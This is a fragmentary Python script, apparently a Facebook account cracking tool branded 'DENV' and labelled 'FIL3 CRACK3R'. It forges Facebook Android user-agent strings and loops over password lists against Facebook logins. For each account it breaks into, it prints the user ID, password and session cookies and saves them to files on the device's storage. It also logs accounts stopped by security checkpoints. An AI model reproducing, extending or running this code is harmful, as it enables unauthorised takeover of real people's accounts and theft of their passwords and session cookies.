...
def F1():
	...
	e = ";[FBAN/FB4A;FBAV/339.0.0.7.186;FBBV/243499947;FBDM/{density=2.3,width=1080,height=1499};FBLC/ "+en+";FBRV/678700597;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/"+kt+";FBDV/M2101K9G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
	f = "Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]"
	ua = s + e + f
	return ua
...
def F2():
	...
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = "[FBAN/FB4A;FBAV/277.0.0.20254;FBBV/279915013;FBDM/{density=1.3312501,width=800,height=1280};FBLC/"+en+";FBRV/0;FBCR/"+fbcr+";FBMF/RMX2176;FBBD/RMX2176;FBPN/"+kt+";FBDV/Realme;FBSV/6;FBOP/1;FBCA/x86:arm64-v8a;]"
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; DENV \x07')   
...
logo=("""\033[1;34m          
    ...
    ██   ██ ███████   ████   ███████                                                                       
\033[1;37m══════════════════════════════════════════════════    
\033[1;37m{•} OWNER : K3VS MATIK3RO
\033[1;37m{•} VERSION : S1.2
\033[1;37m{•} TOOL TYPE : FIL3 CRACK3R
\033[1;37m══════════════════════════════════════════════════""")    
def linex():
	print('\033[1;37m══════════════════════════════════════════════════')    
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDENV\x1b[1;92m-\x1b[1;92mCRCKING\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in fadi:
                                ...
                                print('\r\r\033[1;32m [DENV-OK] %s | %s'%(ids,pas))
                               # cek_apk(session,coki)
                                open('/sdcard/DENV/DENV-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DENV/DENV-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [H I T] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;34m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")			
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;34m [§] Cookies :- '+cookies)
				open('/sdcard/HIT OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])			
				print(f'\r\r\033[1;33m [DENV-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/DENV/DENV-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [DENV-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/DENV-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
